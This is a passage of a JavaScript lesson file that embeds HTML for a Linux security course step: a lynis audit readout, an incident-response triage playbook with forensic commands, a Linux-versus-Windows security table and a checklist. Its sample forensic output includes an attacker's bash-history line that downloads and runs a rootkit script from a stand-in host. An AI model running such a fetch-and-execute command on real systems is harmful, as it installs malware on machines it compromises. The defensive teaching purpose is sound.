class=\"out\">  - Firewall       : YES</span>\n        <span class=\"out\">  - Malware scanner: NO</span>\n        <span class=\"ored\">  - File integrity : NO  ← install AIDE!</span>\n        <span class=\"ored\">  - IDS/IPS        : NO</span>\n        <span class=\"oyn\">Suggestions (32):</span>\n        <span class=\"oyn\">  * Enable auditd [ACCT-9628]</span>\n        <span class=\"oyn\">  * Configure umask in /etc/profile [AUTH-9328]</span>\n        <span class=\"oyn\">  * Install libpam-tmpdir [SHLL-6230]</span>\n        <span class=\"ored\">  * Disable core dumps [KRNL-5820]</span>\n        <span class=\"ored\">  * Configure /tmp with noexec [STRG-1846]</span>\n      </div>\n    </div>\n  </div>\n</div>\n\n<!-- PANEL 11 — INCIDENT RESPONSE -->\n<div class=\"panel\">\n  <div class=\"ph\"><span style=\"font-size:14px\">🚨</span><span class=\"pt\">Incident Response — Linux Compromise Triage Playbook</span><span class=\"pn\">PANEL 11</span></div>\n  <div class=\"pb\">\n    <div class=\"info\"><span style=\"color:var(--c);flex-shrink:0\">ℹ</span><span>When a Linux server is suspected compromised, the order of operations matters. <strong style=\"color:var(--c)\">Preserve evidence first</strong>, contain second, eradicate third. Never reboot before collecting volatile data — /proc is lost on reboot.</span></div>\n\n    <div style=\"display:flex;flex-direction:column;margin-bottom:14px\">\n      <div class=\"atk-step\" style=\"position:relative\"><div class=\"atk-line\"></div>\n        <div class=\"atk-dot\" style=\"border-color:var(--r);color:var(--r)\">1</div>\n        <div class=\"atk-body\" style=\"border-color:rgba(0,212,255,.3)\">\n          <div class=\"atk-title\" style=\"color:var(--c)\">COLLECT VOLATILE DATA (before reboot)</div>\n          <div class=\"atk-desc\">Capture: running processes, network connections, logged-in users, loaded modules, /proc/*/exe, environment variables, memory if possible.</div>\n          <div class=\"atk-cmd\" style=\"color:var(--c);border-color:var(--c)\">ps aux; ss -tunp; who; lsmod; ls -la /proc/*/exe 2>/dev/null; env; w</div>\n        </div>\n      </div>\n      <div class=\"atk-step\" style=\"position:relative\"><div class=\"atk-line\"></div>\n        <div class=\"atk-dot\">2</div>\n        <div class=\"atk-body\">\n          <div class=\"atk-title\">CAPTURE LOGS (before attacker clears them)</div>\n          <div class=\"atk-desc\">Copy all logs to a secure location. Check if logs have been tampered (gaps, truncations, suspicious timestamps).</div>\n          <div class=\"atk-cmd\">cp -a /var/log/ /forensics/logs/ && tar czf /forensics/logs.tar.gz /var/log/</div>\n        </div>\n      </div>\n      <div class=\"atk-step\" style=\"position:relative\"><div class=\"atk-line\"></div>\n        <div class=\"atk-dot\">3</div>\n        <div class=\"atk-body\">\n          <div class=\"atk-title\">IDENTIFY ATTACKER PRESENCE</div>\n          <div class=\"atk-desc\">Find unauthorized users, SSH keys, cron jobs, systemd units, SUID files, suspicious processes, deleted-but-running binaries.</div>\n          <div class=\"atk-cmd\">awk -F: '$3==0' /etc/passwd; ls -la /proc/*/exe | grep deleted; find / -newer /etc/passwd -type f 2>/dev/null</div>\n        </div>\n      </div>\n      <div class=\"atk-step\" style=\"position:relative\"><div class=\"atk-line\"></div>\n        <div class=\"atk-dot\">4</div>\n        <div class=\"atk-body\">\n          <div class=\"atk-title\">CONTAIN — ISOLATE THE HOST</div>\n          <div class=\"atk-desc\">Block all external connections via firewall. Keep host up for forensics but cut off C2 communication. Block at network level if possible.</div>\n          <div class=\"atk-cmd\">nft flush ruleset; nft add table inet block; nft add chain inet block input { type filter hook input priority 0; policy drop; }</div>\n        </div>\n      </div>\n      <div class=\"atk-step\" style=\"position:relative\"><div class=\"atk-line\"></div>\n        <div class=\"atk-dot\">5</div>\n        <div class=\"atk-body\">\n          <div class=\"atk-title\">DETERMINE SCOPE — LATERAL MOVEMENT CHECK</div>\n          <div class=\"atk-desc\">Check: which SSH keys exist on this host? Where could they access? What credentials were in memory? What data was accessible?</div>\n          <div class=\"atk-cmd\">find / -name \"authorized_keys\" 2>/dev/null; find / -name \"id_rsa\" -o -name \"id_ed25519\" 2>/dev/null</div>\n        </div>\n      </div>\n      <div class=\"atk-step\">\n        <div class=\"atk-dot\">6</div>\n        <div class=\"atk-body\">\n          <div class=\"atk-title\">ERADICATE & RECOVER</div>\n          <div class=\"atk-desc\">Remove malware, backdoors, attacker accounts. If rootkit suspected: rebuild from known-good image. Patch the vulnerability used. Verify integrity with AIDE.</div>\n          <div class=\"atk-cmd\">aide --check; lynis audit system; then rebuild if rootkit confirmed</div>\n        </div>\n      </div>\n    </div>\n\n    <div class=\"term\">\n      <div class=\"tbar\"><div class=\"td\" style=\"background:#ff5f57\"></div><div class=\"td\" style=\"background:#febc2e\"></div><div class=\"td\" style=\"background:#28c840\"></div>\n        <span style=\"margin-left:8px;font-size:11px;color:var(--t3);font-family:var(--sans)\">Incident triage commands — full forensic sweep</span></div>\n      <div class=\"tb\">\n        <span class=\"sec\">──── 1. ACTIVE NETWORK CONNECTIONS ────</span>\n        <span><span class=\"pr\">root@lab:~# </span><span style=\"color:#fff\">ss -tunp | grep ESTAB | grep -v \"127.0.0\\|::1\\|10\\.\\|192\\.168\\|172\\.\"</span></span>\n        <span class=\"ored\">tcp ESTAB 0 0 192.168.1.10:59012 203.0.113.99:4444 users:((\"python3\",pid=8841))</span>\n        <span class=\"sec\">──── 2. DELETED RUNNING BINARIES ────</span>\n        <span><span class=\"pr\">root@lab:~# </span><span style=\"color:#fff\">ls -la /proc/*/exe 2>/dev/null | grep \"(deleted)\"</span></span>\n        <span class=\"ored\">lrwxrwxrwx /proc/8841/exe -> /tmp/.x (deleted)</span>\n        <span class=\"sec\">──── 3. RECENTLY MODIFIED FILES ────</span>\n        <span><span class=\"pr\">root@lab:~# </span><span style=\"color:#fff\">find / -not -path '/proc/*' -not -path '/sys/*' -newer /etc/passwd -type f 2>/dev/null | head -20</span></span>\n        <span class=\"ored\">/usr/bin/ls             ← system binary modified!</span>\n        <span class=\"ored\">/etc/cron.d/.sysupdate  ← hidden cron job</span>\n        <span class=\"ored\">/etc/systemd/system/sysmon.service  ← unknown service</span>\n        <span class=\"sec\">──── 4. UNAUTHORIZED UID-0 ACCOUNTS ────</span>\n        <span><span class=\"pr\">root@lab:~# </span><span style=\"color:#fff\">awk -F: '$3==0 {print \"[CRITICAL] UID-0:\", $1}' /etc/passwd</span></span>\n        <span class=\"ogn\">[CRITICAL] UID-0: root</span>\n        <span class=\"ored\">[CRITICAL] UID-0: sysadmin  ← backdoor account!</span>\n        <span class=\"sec\">──── 5. LOADED KERNEL MODULES ────</span>\n        <span><span class=\"pr\">root@lab:~# </span><span style=\"color:#fff\">lsmod | grep -v \"$(cat /lib/modules/$(uname -r)/modules.builtin | sed 's|kernel/||;s|.ko||;s|/|_|g')\" | head -10</span></span>\n        <span class=\"ored\">rootkit_mod    49152  0   ← unsigned module not in known list!</span>\n        <span class=\"sec\">──── 6. BASH HISTORY OF ALL USERS ────</span>\n        <span><span class=\"pr\">root@lab:~# </span><span style=\"color:#fff\">for u in /home/* /root; do echo \"=== $u ===\"; cat \"$u/.bash_history\" 2>/dev/null | tail -5; done</span></span>\n        <span class=\"ored\">=== /root ===</span>\n        <span class=\"ored\">wget http://attacker.com/rootkit.sh -O /tmp/.x && chmod +x /tmp/.x && /tmp/.x</span>\n      </div>\n    </div>\n  </div>\n</div>\n\n<!-- PANEL 12 — LINUX VS WINDOWS SECURITY -->\n<div class=\"panel\">\n  <div class=\"ph\"><span style=\"font-size:14px\">⇄</span><span class=\"pt\">Linux vs Windows — Security Model Comparison</span><span class=\"pn\">PANEL 12</span></div>\n  <div class=\"pb\">\n    <table class=\"tbl\">\n      <thead><tr><th>Security Dimension</th><th>🐧 Linux</th><th>🪟 Windows</th></tr></thead>\n      <tbody>\n        <tr><td>Attack surface</td><td style=\"color:var(--g)\">Smaller default install; services opt-in; no GUI required</td><td style=\"color:var(--t2)\">Larger by default; many services running; GUI = larger attack surface</td></tr>\n        <tr><td>Mandatory Access Control</td><td style=\"color:var(--g)\">SELinux / AppArmor — confines even root-owned processes</td><td style=\"color:var(--y)\">Integrity Levels (Low/Medium/High/System) — less granular</td></tr>\n        <tr><td>Audit logging</td><td style=\"color:var(--g)\">auditd — kernel-level, cannot be bypassed, syscall-granular</td><td style=\"color:var(--t2)\">Windows Event Log (4624, 4688 etc.) — Event IDs, good but less granular</td></tr>\n        <tr><td>Malware prevalence</td><td style=\"color:var(--g)\">Lower — most malware targets Windows; permission model limits damage</td><td style=\"color:var(--r)\">Higher — 90%+ of malware targets Windows; drive-by execution common</td></tr>\n        <tr><td>Patch cadence</td><td style=\"color:var(--g)\">apt/dnf — fast, targeted, can update individual packages</td><td style=\"color:var(--y)\">Patch Tuesday — monthly batch; emergency patches for critical CVEs</td></tr>\n        <tr><td>Remote admin</td><td style=\"color:var(--g)\">SSH (encrypted, key-based, auditable, scriptable)</td><td style=\"color:var(--y)\">RDP (GUI) — historically many CVEs (BlueKeep, DejaBlue)</td></tr>\n        <tr><td>Encryption at rest</td><td style=\"color:var(--g)\">LUKS (block-level, open standard, multiple key slots)</td><td style=\"color:var(--g)\">BitLocker (full volume, TPM integrated, good enterprise support)</td></tr>\n        <tr><td>Pass-the-hash</td><td style=\"color:var(--g)\">Not directly applicable (different auth flow)</td><td style=\"color:var(--r)\">Major risk — NTLM hashes replayable without cracking</td></tr>\n        <tr><td>Supply chain</td><td style=\"color:var(--g)\">Signed packages, reproducible builds, GPG signatures</td><td style=\"color:var(--y)\">Code signing (Authenticode), Windows Update — less granular</td></tr>\n        <tr><td>Forensics transparency</td><td style=\"color:var(--g)\">/proc, /sys, strace, auditd, full source — complete visibility</td><td style=\"color:var(--r)\">Kernel internals less accessible; Sysinternals suite needed</td></tr>\n        <tr><td>Security advisories</td><td style=\"color:var(--g)\">Distro-specific (USN, RHSA) + upstream kernel CVE list</td><td style=\"color:var(--t2)\">Microsoft Security Response Center (MSRC) monthly bulletins</td></tr>\n        <tr><td>Password cracking risk</td><td style=\"color:var(--g)\">SHA-512 in /etc/shadow — computationally expensive</td><td style=\"color:var(--r)\">NT hash (MD4) — fast to crack; no salt; rainbow tables exist</td></tr>\n        <tr><td>Sandbox</td><td style=\"color:var(--g)\">seccomp, namespaces, cgroups, capabilities — fine-grained</td><td style=\"color:var(--y)\">AppContainer, sandbox app model — mainly for UWP apps</td></tr>\n      </tbody>\n    </table>\n  </div>\n</div>\n\n<!-- PANEL 13 — CHECKLIST -->\n<div class=\"panel\">\n  <div class=\"ph\"><span style=\"font-size:14px\">✔</span><span class=\"pt\">Auditor / Security Checklist — Step 7 Verification</span><span class=\"pn\">PANEL 13</span></div>\n  <div class=\"pb\">\n    <ul class=\"cl\">\n      <li><div class=\"chk\">✓</div>Can you explain all 7 layers of defence-in-depth and which tool operates at each layer?<span class=\"tag tg\" style=\"margin-left:auto\">ARCH</span></li>\n      <li><div class=\"chk\">✓</div>Can you produce a hardened /etc/ssh/sshd_config — disable password auth, root login, X11, TCP forwarding?<span class=\"tag tc\" style=\"margin-left:auto\">SSH</span></li>\n      <li><div class=\"chk\">✓</div>Can you audit all authorized_keys files across all users on a system?<span class=\"tag tr2\" style=\"margin-left:auto\">SSH AUDIT</span></li>\n      <li><div class=\"chk\">✓</div>Can you set up LUKS disk encryption and explain the key slot hierarchy?<span class=\"tag ty\" style=\"margin-left:auto\">LUKS</span></li>\n      <li><div class=\"chk\">✓</div>Can you write a comprehensive auditd ruleset covering identity, sudo, execve, and binary changes?<span class=\"tag tp\" style=\"margin-left:auto\">AUDITD</span></li>\n      <li><div class=\"chk\">✓</div>Can you initialize AIDE, run a check, and interpret the output to detect binary replacement?<span class=\"tag tg\" style=\"margin-left:auto\">FIM</span></li>\n      <li><div class=\"chk\">✓</div>Can you identify all 8 attack vectors in this lesson and explain the detection method for each?<span class=\"tag tr2\" style=\"margin-left:auto\">RED TEAM</span></li>\n      <li><div class=\"chk\">✓</div>Can you apply the complete kernel hardening sysctl set and verify ASLR is enabled?<span class=\"tag tc\" style=\"margin-left:auto\">KERNEL</span></li>\n      <li><div class=\"chk\">✓</div>Can you configure fail2ban with custom jail settings and verify banned IPs?<span class=\"tag tg\" style=\"margin-left:auto\">FAIL2BAN</span></li>\n      <li><div class=\"chk\">✓</div>Can you check for pending CVE patches, apply security-only updates, and check for kernel reboot need?<span class=\"tag ty\" style=\"margin-left:auto\">PATCH</span></li>\n      <li><div class=\"chk\">✓</div>Can you execute the 6-step incident response triage playbook on a suspected compromise?<span class=\"tag tr2\" style=\"margin-left:auto\">IR</span></li>\n      <li><div class=\"chk\">✓</div>Can you run lynis and interpret the hardening index + suggestions?<span class=\"tag tp\" style=\"margin-left:auto\">CIS</span></li>\n    </ul>\n  </div>\n</div>\n\n<!-- PANEL 14 — SUMMARY -->\n<div class=\"panel\">\n  <div class=\"ph\"><span style=\"font-size:14px\">◉</span><span class=\"pt\">Summary — Step 7 Complete</span><span class=\"pn\">PANEL 14</span></div>\n  <div class=\"pb\">\n    <div class=\"g3\" style=\"margin-bottom:0\">\n      <div class=\"sum-card\">\n        <div class=\"sc-l\">Defence-in-Depth</div>\n        <div class=\"sc-v\">7 layers from physical to monitoring. No single control is sufficient. SSH key-only auth + firewall default-deny + auditd + SELinux + kernel hardening + AIDE + SIEM = production-grade posture. Each layer assumes the one above it may fail.</div>\n      </div>\n      <div class=\"sum-card\">\n        <div class=\"sc-l\">Detection & Forensics</div>\n        <div class=\"sc-v\">auditd captures all syscalls. AIDE detects binary replacement. /proc/PID/exe reveals deleted binaries. ss shows C2 connections. Log forwarding to SIEM prevents evidence destruction. chattr +a protects log integrity.</div>\n      </div>\n      <div class=\"sum-card\">\n        <div class=\"sc-l\">Attacker Mindset</div>\n        <div class=\"sc-v\">8 core attack paths: SUID abuse, credential dump, cron implant, systemd backdoor, SSH key theft, log tampering, kernel exploit, DNS tunneling. Each maps to MITRE ATT&CK. Know the attack to build the defence.</div>\n      </div>\n    </div>\n    <div class=\"nxt\">\n      <div>\n        <div style=\"font-family:var(--sans);font-weight:600;font-size:14px;color:var(--g)\">▶ Next: Step 8 — Linux Boot Process Deep Understanding</div>\n        <div style=\"font-size:11px;color:var(--t3);margin-top:2px\">BIOS/UEFI · GRUB internals · kernel loading · initramfs · systemd targets · boot troubleshooting · Linux vs Windows boot · Secure Boot chain</div>\n      </div>\n      <button class=\"nb\" onclick=\"window.sendPrompt && window.sendPrompt('Start Step 8')\">$ Start Step 8 →</button>\n    </div>\n  </div>\n</div>\n\n</div>";

export default function LinuxStep7() {
  return <LessonDocument title="Security Deep Understanding" styles={styles} markup={markup} />;
}
